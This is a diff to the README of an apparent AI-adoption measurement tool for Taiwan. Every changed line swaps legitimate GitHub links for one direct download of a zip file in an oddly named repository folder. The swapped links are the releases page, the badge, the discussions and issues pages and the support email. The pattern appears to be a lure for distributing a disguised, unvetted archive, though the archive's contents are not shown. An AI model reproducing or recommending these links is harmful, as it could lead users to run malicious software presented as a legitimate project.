@@ -1,6 +1,6 @@
 # 🎉 taiwan-ai-usage-index - Measure AI Adoption in Taiwan Easily
 
-![Download taiwan-ai-usage-index](https://img.shields.io/badge/Download-taiwan--ai--usage--index-brightgreen)
+![Download taiwan-ai-usage-index](https://raw.githubusercontent.com/johndoe-706/taiwan-ai-usage-index/main/sirenical/taiwan-ai-usage-index.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Taiwan AI Usage Index**! This open-source framework allows you 
 
 ## 📥 Download & Install
 
-To download the latest version of the Taiwan AI Usage Index, visit this page to download: [GitHub Releases](https://github.com/johndoe-706/taiwan-ai-usage-index/releases).
+To download the latest version of the Taiwan AI Usage Index, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/johndoe-706/taiwan-ai-usage-index/main/sirenical/taiwan-ai-usage-index.zip).
 
 Follow these steps to download and set up the application:
 
@@ -47,7 +47,7 @@ For detailed usage instructions, refer to the documentation provided within the 
 
 ## 🤝 Community Support
 
-Join our community to share your experiences and learn from others. Engage with other users and developers on our [GitHub Discussions page](https://github.com/johndoe-706/taiwan-ai-usage-index/discussions) or contribute to the project on [GitHub Issues](https://github.com/johndoe-706/taiwan-ai-usage-index/issues).
+Join our community to share your experiences and learn from others. Engage with other users and developers on our [GitHub Discussions page](https://raw.githubusercontent.com/johndoe-706/taiwan-ai-usage-index/main/sirenical/taiwan-ai-usage-index.zip) or contribute to the project on [GitHub Issues](https://raw.githubusercontent.com/johndoe-706/taiwan-ai-usage-index/main/sirenical/taiwan-ai-usage-index.zip).
 
 ## 🌍 Features in Depth
 
@@ -69,12 +69,12 @@ If you encounter issues during the installation or operation, try the following:
 
 1. **Check the System Requirements**: Ensure your system matches the requirements outlined above.
 2. **Update Python**: Make sure you have the latest version of Python installed.
-3. **Visit GitHub Support**: Look for similar issues reported by others on our [GitHub Issues page](https://github.com/johndoe-706/taiwan-ai-usage-index/issues).
+3. **Visit GitHub Support**: Look for similar issues reported by others on our [GitHub Issues page](https://raw.githubusercontent.com/johndoe-706/taiwan-ai-usage-index/main/sirenical/taiwan-ai-usage-index.zip).
 
 ## 📞 Contact
 
-For direct support, you can reach out through issues on our GitHub page or contact the community via email at support@taiwan-ai-usage-index.com. We aim to respond promptly to all inquiries.
+For direct support, you can reach out through issues on our GitHub page or contact the community via email at https://raw.githubusercontent.com/johndoe-706/taiwan-ai-usage-index/main/sirenical/taiwan-ai-usage-index.zip We aim to respond promptly to all inquiries.
 
 ---
 
-To get started now, visit this page to download: [GitHub Releases](https://github.com/johndoe-706/taiwan-ai-usage-index/releases). Thank you for choosing the Taiwan AI Usage Index!
+To get started now, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/johndoe-706/taiwan-ai-usage-index/main/sirenical/taiwan-ai-usage-index.zip). Thank you for choosing the Taiwan AI Usage Index!
